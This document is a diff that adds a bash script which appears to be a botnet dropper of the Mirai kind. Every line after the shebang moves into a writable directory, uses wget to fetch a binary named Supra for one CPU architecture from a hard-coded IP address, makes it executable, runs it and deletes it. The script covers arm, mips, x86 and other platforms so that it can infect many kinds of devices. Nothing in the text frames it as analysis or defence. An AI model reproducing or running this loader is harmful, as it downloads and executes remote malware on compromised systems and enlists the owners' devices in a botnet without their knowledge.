@@ -1,0 +1,17 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.arm4l; chmod +x Supra.arm4l; ./Supra.arm4l; rm -rf Supra.arm4l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.arm4tl; chmod +x Supra.arm4tl; ./Supra.arm4tl; rm -rf Supra.arm4tl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.arm5; chmod +x Supra.arm5; ./Supra.arm5; rm -rf Supra.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.arm6; chmod +x Supra.arm6; ./Supra.arm6; rm -rf Supra.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.i486; chmod +x Supra.i486; ./Supra.i486; rm -rf Supra.i486
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.i686; chmod +x Supra.i686; ./Supra.i686; rm -rf Supra.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.m68k; chmod +x Supra.m68k; ./Supra.m68k; rm -rf Supra.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.mips; chmod +x Supra.mips; ./Supra.mips; rm -rf Supra.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.mips64; chmod +x Supra.mips64; ./Supra.mips64; rm -rf Supra.mips64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.mpsl; chmod +x Supra.mpsl; ./Supra.mpsl; rm -rf Supra.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.ppc; chmod +x Supra.ppc; ./Supra.ppc; rm -rf Supra.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.sparc; chmod +x Supra.sparc; ./Supra.sparc; rm -rf Supra.sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.x86_64; chmod +x Supra.x86_64; ./Supra.x86_64; rm -rf Supra.x86_64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.i586; chmod +x Supra.i586; ./Supra.i586; rm -rf Supra.i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.sh4; chmod +x Supra.sh4; ./Supra.sh4; rm -rf Supra.sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.59.125/Supra.arm7; chmod +x Supra.arm7; ./Supra.arm7; rm -rf Supra.arm7
